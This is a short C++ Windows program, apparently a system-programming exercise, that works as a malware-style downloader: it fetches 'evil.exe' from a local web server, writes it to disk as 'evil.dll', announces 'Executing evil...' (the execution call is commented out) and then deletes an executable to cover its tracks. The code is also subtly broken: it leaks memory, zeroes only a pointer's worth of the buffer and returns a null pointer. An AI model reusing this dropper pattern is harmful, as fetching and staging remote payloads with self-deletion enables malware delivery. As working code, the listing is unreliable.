#include <Windows.h>
#include <iostream>
#include <wininet.h>

char *getEvil() {
    HINTERNET hSession = InternetOpen((LPCSTR) "Mozilla/5.0", 
                                      INTERNET_OPEN_TYPE_DIRECT, 
                                      NULL, 
                                      NULL, 
                                      0);
    HINTERNET hHttpFile = InternetOpenUrl(hSession, 
                                          (LPCSTR) "http://localhost:8081/evil.exe", 
                                          0, 
                                          0, 
                                          0, 
                                          0);
    DWORD dwFileSize = 1024;
    char *buffer = new char[dwFileSize + 1];
    DWORD dwBytesRead;
    DWORD dwBytesWritten;
    HANDLE hFile = CreateFile("C:\\Temp\\evil.dll", 
                              GENERIC_READ | GENERIC_WRITE, 
                              FILE_SHARE_READ, 
                              NULL, 
                              OPEN_ALWAYS, 
                              FILE_ATTRIBUTE_NORMAL, 
                              NULL);

    do {
        buffer = new char[dwFileSize + 1];
        ZeroMemory(buffer, sizeof(buffer));
        InternetReadFile(hHttpFile, (LPVOID)buffer, dwFileSize, &dwBytesRead);
        WriteFile(hFile, &buffer[0], dwBytesRead, &dwBytesWritten, NULL);
        delete[] buffer;
        buffer = NULL;
    } while (dwBytesRead);

    CloseHandle(hFile);
    InternetCloseHandle(hHttpFile);
    InternetCloseHandle(hSession);
    return buffer;
}

// Delete the file after execution
void deleteEvil() {
    const char *path = "D:\\VCS\\System Programming\\system-programming\\Windows\\Downloader\\cac.exe";

    if (remove(path) != 0) {
        std::cout << "Error deleting file." << std::endl;
    } else {
        std::cout << "File deleted." << std::endl;
    }
}

int main() {
    char *evil = getEvil(); 
    std::cout << "Evil downloaded." << std::endl;
    std::cout << "Executing evil..." << std::endl;
    // ((void(*)())evil)();

    // Self delete
    deleteEvil();

    return 0;
}